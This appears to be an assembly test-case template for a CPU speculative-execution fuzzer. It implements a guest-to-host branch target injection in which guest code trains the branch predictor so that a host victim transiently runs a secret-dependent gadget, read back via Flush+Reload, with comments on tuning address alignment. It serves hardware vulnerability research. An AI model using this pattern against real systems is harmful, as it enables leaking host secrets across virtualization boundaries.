.intel_syntax noprefix

# ============================================================================
# vBTI_GS->HU, transient-only redesign.
#
# Goal: the shared (aliased) channel must expose ONLY the victim's TRANSIENT
# (mispredicted) footprint, never its architectural one -- otherwise the leak is
# just "shared memory reveals the victim's data" (see template-gs2hu.asm, whose
# no-jmp control also violates). Mirrors why V2V's no-jmp is clean: the victim's
# architectural data and the observer's readout are only bridged by misprediction.
#
# Design:
#   attacker (guest kernel, observer, data_alias=victim):
#       - warm: measurement_start
#       - train: ONE indirect jmp that trains the BTB target = attacker_disclosure
#                offset. NO data-reading gadget (so the attacker never encodes the
#                victim's data itself).
#       - measure: F+R only (zeroed GPRs; see the register-reset note).
#   victim (host user):
#       - loads its secret input into GPRs
#       - an indirect jmp whose ARCHITECTURAL target is `victim_safe` (which does
#         NOTHING secret-dependent -> input-independent architectural footprint)
#       - `victim_disclosure` (secret-dependent access) is reached ONLY when the
#         attacker-trained BTB entry makes the jmp mispredict there.
#
# Controls: template-gs2hu-transient-no-jmp.asm removes both indirect jmps.
#   expected: no-jmp CLEAN, baseline violates -> genuine vBTI_GS->HU.
#
# EMPIRICAL CRUX: for the victim to mispredict into victim_disclosure, that gadget
# must sit at the same low address bits as attacker_disclosure (BTB low-bit index
# + context high bits). Host and guest live at different virtual bases, so this is
# the knob that decides whether it reproduces at all -- tune the preamble lengths
# / disclosure offset if baseline stays clean.
# ============================================================================

# ----------------------------- Host orchestrator ----------------------------
.section .data.main
.function_main_0:
    .macro.set_h2g_target.attacker.function_attacker_0:
    .macro.set_g2h_target.main.function_main_1:
    .macro.switch_h2g.attacker.0:

.function_main_1:
    .macro.landing_g2h.main_1:
    # attacker trains the BTB (no IBPB afterwards)
    .macro.set_h2g_target.attacker.function_attacker_train:
    .macro.set_g2h_target.main.function_main_2:
    .macro.switch_h2g.attacker.1:

.function_main_2:
    .macro.landing_g2h.main_2:
    # host-user victim runs; its indirect jmp may mispredict to the trained target
    .macro.set_k2u_target.victim.function_victim_1:
    .macro.set_u2k_target.main.function_main_3:
    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
    .macro.switch_k2u.victim.1:

.function_main_3:
    .macro.landing_u2k.main_3:
.macro.fault_handler:
.patch_placeholder_fault_handler:
    # attacker measures
    .macro.set_h2g_target.attacker.function_attacker_measure:
    .macro.set_g2h_target.main.function_main_4:
    .macro.switch_h2g.attacker.2:

.function_main_4:
    .macro.landing_g2h.main_4:
    nop


# ----------------------------- Attacker (guest kernel, observer) ------------
.section .data.attacker
.function_attacker_0:
    .macro.landing_h2g.attacker_0:
    .macro.measurement_start.attacker_0:
    .macro.switch_g2h.main.attacker_0:
    lfence

# Train ONLY: an indirect jmp that pins the BTB target to attacker_disclosure.
# No memory-reading gadget here -> the attacker never encodes the victim's data.
.function_attacker_train:
    .macro.landing_h2g.attacker_1:
    .macro.random_instructions.16.4.att_pre:
    lea rax, qword ptr [rip + .function_attacker_disclosure]  # noremove
    jmp rax  # noremove
.function_attacker_disclosure:
    lfence  # noremove   (train target; deliberately inert)
    .macro.switch_g2h.main.attacker_1:
    lfence

# Measure ONLY: zero GPRs (deterministic final state), then F+R. No gadget.
.function_attacker_measure:
    .macro.landing_h2g.attacker_2:
    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
    .macro.measurement_end.attacker_2:
    .macro.switch_g2h.main.2:
    lfence


# ----------------------------- Victim (host user) ---------------------------
.section .data.victim
.function_victim_1:
    .macro.landing_k2u.victim_1:

    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mov rcx, qword ptr [r14 + 0x2010] # noremove
    mov rdx, qword ptr [r14 + 0x2018] # noremove
    mov rsi, qword ptr [r14 + 0x2020] # noremove
    mov rdi, qword ptr [r14 + 0x2028] # noremove
    mfence # noremove

    # Mirror the attacker's preamble so the jmp collides in the BTB.
    .macro.random_instructions.16.4.vic_pre:

    lea rbx, qword ptr [rip + .function_victim_safe]  # noremove
    jmp rbx  # noremove   # ARCH -> victim_safe;  mispredict -> victim_disclosure

# Architectural target: NO secret-dependent memory access -> input-independent
# footprint. (Also the fall-through target for the no-jmp control.)
.function_victim_safe:
    lfence  # noremove
    .macro.switch_u2k.main.1:
    lfence

# Disclosure gadget: reached ONLY transiently (BTB residue). Secret-dependent
# access encodes rax (secret) into a cache line the attacker's F+R can read.
.function_victim_disclosure:
    and rax, 0b1111111111111  # noremove
    mov rcx, qword ptr [r14 + rax]   # noremove   (transient: leak secret index)
    and rcx, 0b1111111111111  # noremove
    mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache)
    lfence  # noremove
    .macro.switch_u2k.main.2:
    lfence


# ----------------------------- Exit -----------------------------------------
.section .data.main
.test_case_exit:
